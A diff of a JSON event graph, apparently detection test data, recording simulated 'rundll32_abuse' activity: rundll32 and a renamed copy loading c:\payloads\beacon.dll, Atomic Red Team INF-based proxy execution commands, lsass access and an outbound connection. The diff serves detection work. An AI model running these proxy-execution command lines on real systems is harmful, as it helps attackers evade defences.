+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "ee66fdf9fbd9ffe53e162f78d5781e5a4c496a1557b070b809f0792e37f98830",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notrundll32.exe",
+        "name": "notrundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
       }
     },
     {
@@ -1998,6 +2150,140 @@
         "user_id": "User:S-1-5-18",
         "event_id": "1",
         "id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-CF05-6022-85A3-00000000A301}",
+        "pid": "1376",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  c:\\payloads\\beacon.dll,start <rundll32_abuse>",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "network:93.184.220.29:80:tcp",
+      "label": "93.184.220.29",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "93.184.220.29",
+        "destination_port": "80",
+        "protocol": "tcp",
+        "domain_name": "-",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
+        "event_id": "3",
+        "id": "network:93.184.220.29:80:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "93.184.220.29",
+        "name": "93.184.220.29"
+      }
+    },
+    {
+      "id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
+      "label": "csrss.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{1AADB668-4FDB-601C-CC08-00000000A301}",
+        "pid": "3644",
+        "image_path": "%system32%\\csrss.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "csrss.exe",
+        "name": "csrss.exe"
+      }
+    },
+    {
+      "id": "File:6da22ed04c16469ceaa8b6ae5daf492b2fe18ba9b21e6c9e28452356c28dcb6d:17",
+      "label": "msse-1996-server",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "msse-1996-server",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
+        "event_id": "17",
+        "id": "File:6da22ed04c16469ceaa8b6ae5daf492b2fe18ba9b21e6c9e28452356c28dcb6d:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msse-1996-server",
+        "name": "msse-1996-server"
+      }
+    },
+    {
+      "id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{1AADB668-500B-601C-0309-00000000A301}",
+        "pid": "2712",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{1AADB668-500B-601C-0309-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{834264DD-651B-6206-F500-000000002802}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{834264DD-651B-6206-F500-000000002802}",
+        "pid": "6560",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll #2",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
+        "command_hash": "9b184bdafc009587b08933d214a36e0246ad052b6dcb4829c9f0d804aeb255a3",
+        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{834264DD-651B-6206-F500-000000002802}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "windows host process (rundll32)",
@@ -2029,99 +2315,27 @@
       }
     },
     {
-      "id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
-      "label": "cmd.exe",
+      "id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
+      "label": "windows command processor",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{834264DD-64E7-6206-E200-000000002802}",
-        "pid": "6596",
+        "guid": "{D700CDCA-C0BE-6022-B4A1-00000000A301}",
+        "pid": "6520",
         "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll                                                                                                                                             #2blahblah",
+        "command_line": "%system32%\\cmd.exe",
         "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
-        "command_hash": "851b3ef891d5995ad2a6bef02c35f96d967250fa49a66efa9a2e01be2e583809",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "f7468ae7f32434e4af53d9eaef5ed53681022d611a5919cd0d3ea4474a11ff9d",
+        "parent_process_id": "Process:{D700CDCA-8E14-6021-A97C-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
+        "id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0448-5FC5-1200-000000009101}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for windows services",
-        "guid": "{9014E149-0448-5FC5-1200-000000009101}",
-        "pid": "1200",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "%system32%\\svchost.exe -k localservice",
-        "original_file_name": "svchost.exe",
-        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
-        "command_hash": "43efe1f55a8b3625d47dc16b069f9dae68a9c3196f565c6c30e5ad5769e00b19",
-        "event_id": "1",
-        "id": "Process:{9014E149-0448-5FC5-1200-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0A00-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
-      "label": "notrundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{D700CDCA-C0EE-6022-CCA1-00000000A301}",
-        "pid": "7116",
-        "image_path": "c:\\temp\\notrundll32.exe",
-        "command_line": "c:\\temp\\notrundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "ee66fdf9fbd9ffe53e162f78d5781e5a4c496a1557b070b809f0792e37f98830",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notrundll32.exe",
-        "name": "notrundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-C0EE-6022-CBA1-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{D700CDCA-C0F4-6022-CDA1-00000000A301}",
-        "pid": "7556",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "%system32%\\rundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "5ab9ecca5d68b30cc81b8eb9aec8420452b73ea6b0108f8c6a53fa8c356ed348",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "windows command processor",
+        "name": "windows command processor"
       }
     },
     {
@@ -2149,185 +2363,27 @@
       }
     },
     {
-      "id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-0703-5FC5-D501-000000009101}",
-        "pid": "3852",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe setupapi.dll,installhinfsection defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "c71fa7041d5b858acf3d1a5ce16dc1d64c8dc0352c09b765557b69e56edad9a6",
-        "event_id": "1",
-        "id": "Process:{9014E149-0703-5FC5-D501-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{D700CDCA-CFF8-6022-A4A3-00000000A301}",
-        "pid": "6696",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "%system32%\\rundll32.exe",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "0e04d438d4be6b7ed8d1c6be2d2467b595ee7dae3923d8112f3559f47eb166b6",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "File:270f01aac4b93a9ba912504a0af346441a355d0e337da0987ab4d4d04284362a:17",
-      "label": "msse-918-server",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "msse-918-server",
-        "source_image_path": "c:\\temp\\notrundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
-        "event_id": "17",
-        "id": "File:270f01aac4b93a9ba912504a0af346441a355d0e337da0987ab4d4d04284362a:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "msse-918-server",
-        "name": "msse-918-server"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
-      "label": "lsass.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "local security authority process",
-        "guid": "{9014E149-0446-5FC5-0B00-000000009101}",
-        "pid": "860",
-        "image_path": "%system32%\\lsass.exe",
-        "command_line": "%system32%\\lsass.exe",
-        "original_file_name": "lsass.exe",
-        "image_hash": "MD5=5AE8589CDDE46ED132AEF8280BC8894A,SHA256=D957A03C6EA35CBF0C90B0B088DF07E7803A1A3EEB4BA889038F88DB066BBDC4,IMPHASH=0AA67FE637515AC7535797573607EAA2",
-        "command_hash": "5744d2ba6f9b20f49faec3b0454061b6ce1f2d732837df047479d133523ee1b6",
-        "event_id": "1",
-        "id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "lsass.exe",
-        "name": "lsass.exe",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0700-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-0702-5FC5-CF01-000000009101}",
-        "pid": "4704",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe advpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "543e2f3e38594f03fe155bbe4dc0064fd9daadedb539f05fea95460e1dc052b9",
-        "event_id": "1",
-        "id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "network:93.184.220.29:80:tcp",
-      "label": "93.184.220.29",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "93.184.220.29",
-        "destination_port": "80",
-        "protocol": "tcp",
-        "domain_name": "-",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
-        "event_id": "3",
-        "id": "network:93.184.220.29:80:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "93.184.220.29",
-        "name": "93.184.220.29"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:10",
+      "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:10",
       "label": "rundll32.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "rundll32.exe",
-        "guid": "{9014E149-0703-5FC5-D201-000000009101}",
-        "pid": "2576",
+        "guid": "{D700CDCA-C0E7-6022-CAA1-00000000A301}",
+        "pid": "6484",
         "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1000 for rundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for rundll32.exe",
         "original_file_name": "",
         "image_hash": "",
-        "command_hash": "19a8736ee1499e17ad4896c9317b036528504470bbe7f114cc2fb4cd29c6767c",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
+        "command_hash": "85ea392028d0862089bd402029f31d85b2d39f8d2c21d762429dba4e3587bfd2",
+        "parent_process_id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
         "user_id": "User:S-1-5-18",
         "event_id": "10",
-        "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:10",
+        "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:10",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "rundll32.exe",
         "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
-      "label": "powershell_ise.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-9959-6021-267E-00000000A301}",
-        "pid": "6892",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell_ise.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell_ise.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell_ise.exe",
-        "name": "powershell_ise.exe"
       }
     }
   ],
@@ -2343,7 +2399,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.630912+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2357,7 +2413,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.630912+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2371,7 +2427,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.634739+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2385,7 +2441,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.634739+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2399,7 +2455,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.634739+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2413,7 +2469,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.634739+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2427,7 +2483,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.634739+00:00"
+        "timestamp": "2026-05-08T16:35:35.407052+00:00"
       }
     },
     {
@@ -2441,7 +2497,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.819957+00:00"
+        "timestamp": "2026-05-08T16:35:35.974543+00:00"
       }
     },
     {
@@ -2455,7 +2511,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.819957+00:00"
+        "timestamp": "2026-05-08T16:35:35.990716+00:00"
       }
     },
     {
@@ -2469,7 +2525,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.819957+00:00"
+        "timestamp": "2026-05-08T16:35:35.990716+00:00"
       }
     },
     {
@@ -2483,7 +2539,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.012924+00:00"
       }
     },
     {
@@ -2497,7 +2553,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.012924+00:00"
       }
     },
     {
@@ -2511,7 +2567,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.014923+00:00"
       }
     },
     {
@@ -2525,7 +2581,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.017923+00:00"
       }
     },
     {
@@ -2539,7 +2595,7 @@
       "properties": {
         "action": "DNS Query",
         "event_id": "22",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.018920+00:00"
       }
     },
     {
@@ -2553,7 +2609,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.019921+00:00"
       }
     },
     {
@@ -2567,7 +2623,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-08T15:44:08.825302+00:00"
+        "timestamp": "2026-05-08T16:35:36.019921+00:00"
       }
     },
     {
@@ -2581,7 +2637,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:08.846905+00:00"
+        "timestamp": "2026-05-08T16:35:36.063900+00:00"
       }
     },
     {
@@ -2595,7 +2651,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.848905+00:00"
+        "timestamp": "2026-05-08T16:35:36.073673+00:00"
       }
     },
     {
@@ -2609,7 +2665,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.849905+00:00"
+        "timestamp": "2026-05-08T16:35:36.073673+00:00"
       }
     },
     {
@@ -2623,7 +2679,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:08.907015+00:00"
+        "timestamp": "2026-05-08T16:35:36.217161+00:00"
       }
     },
     {
@@ -2637,7 +2693,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.907015+00:00"
+        "timestamp": "2026-05-08T16:35:36.233410+00:00"
       }
     },
     {
@@ -2651,7 +2707,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.907015+00:00"
+        "timestamp": "2026-05-08T16:35:36.233410+00:00"
       }
     },
     {
@@ -2665,7 +2721,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:08.942594+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2679,7 +2735,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.944598+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2693,7 +2749,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.945107+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2707,7 +2763,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.945107+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2721,7 +2777,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.947117+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2735,7 +2791,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:08.947117+00:00"
+        "timestamp": "2026-05-08T16:35:36.329352+00:00"
       }
     },
     {
@@ -2749,7 +2805,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.947117+00:00"
+        "timestamp": "2026-05-08T16:35:36.345212+00:00"
       }
     },
     {
@@ -2763,7 +2819,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:08.947117+00:00"
+        "timestamp": "2026-05-08T16:35:36.345212+00:00"
       }
     },
     {
@@ -2777,7 +2833,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:09.127904+00:00"
+        "timestamp": "2026-05-08T16:35:36.910706+00:00"
       }
     },
     {
@@ -2791,7 +2847,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.129052+00:00"
+        "timestamp": "2026-05-08T16:35:36.910706+00:00"
       }
     },
     {
@@ -2805,7 +2861,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.189424+00:00"
+        "timestamp": "2026-05-08T16:35:37.090352+00:00"
       }
     },
     {
@@ -2819,7 +2875,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-08T15:44:09.197820+00:00"
+        "timestamp": "2026-05-08T16:35:37.137677+00:00"
       }
     },
     {
@@ -2833,7 +2889,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.197820+00:00"
+        "timestamp": "2026-05-08T16:35:37.154049+00:00"
       }
     },
     {
@@ -2847,7 +2903,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.222360+00:00"
+        "timestamp": "2026-05-08T16:35:37.201548+00:00"
       }
     },
     {
@@ -2861,7 +2917,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.247851+00:00"
+        "timestamp": "2026-05-08T16:35:37.280772+00:00"
       }
     },
     {
@@ -2875,7 +2931,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.303919+00:00"
+        "timestamp": "2026-05-08T16:35:37.454925+00:00"
       }
     },
     {
@@ -2889,7 +2945,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.306896+00:00"
+        "timestamp": "2026-05-08T16:35:37.470761+00:00"
       }
     },
     {
@@ -2903,7 +2959,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:09.422515+00:00"
+        "timestamp": "2026-05-08T16:35:37.847082+00:00"
       }
     },
     {
@@ -2917,7 +2973,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T15:44:09.422515+00:00"
+        "timestamp": "2026-05-08T16:35:37.847082+00:00"
       }
     },
     {
@@ -2931,7 +2987,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.424519+00:00"
+        "timestamp": "2026-05-08T16:35:37.847082+00:00"
       }
     },
     {
@@ -2945,7 +3001,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.424519+00:00"
+        "timestamp": "2026-05-08T16:35:37.847082+00:00"
       }
     },
     {
@@ -2959,7 +3015,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:09.430814+00:00"
+        "timestamp": "2026-05-08T16:35:37.867452+00:00"
       }
     },
     {
@@ -2973,7 +3029,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T15:44:09.430814+00:00"
+        "timestamp": "2026-05-08T16:35:37.867452+00:00"
       }
     },
     {
